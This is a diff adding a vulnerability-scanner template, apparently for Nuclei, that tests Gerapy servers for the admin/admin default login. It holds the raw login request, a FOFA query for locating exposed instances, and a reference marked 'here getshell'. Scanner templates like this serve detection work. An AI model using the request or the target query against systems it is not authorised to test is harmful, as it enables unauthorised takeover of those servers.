@@ -1,0 +1,31 @@
+id: gerapy-default-login
+info:
+  name: gerapy - default-login
+  author: leadlife
+  severity: high
+  description: Gerapy是一款基于Scrapy、Scrapyd、Django和Vue.js的分布式爬虫管理框架，其存在弱口令，攻击者可直接进入后台接管业务功能。
+  reference: 
+    - https://github.com/CRlife/Rscan/blob/0edbf44689fbc876294a7d8603639dfe44fabeee/poc/yaml-poc/poc-yaml-Gerapy-admin-default.yaml
+    - https://blog.csdn.net/weixin_45778886/article/details/122332845 # here getshell
+  classification:
+    cve-id: CVE-2021-43857
+  metadata:
+    verified: true
+    fofa-query: title="Gerapy"
+  tags: gerapy,default-login
+
+http:
+  - raw:
+      - |
+        POST /api/user/auth HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"username":"admin","password":"admin"}
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains_all(body,'token')
+        condition: and
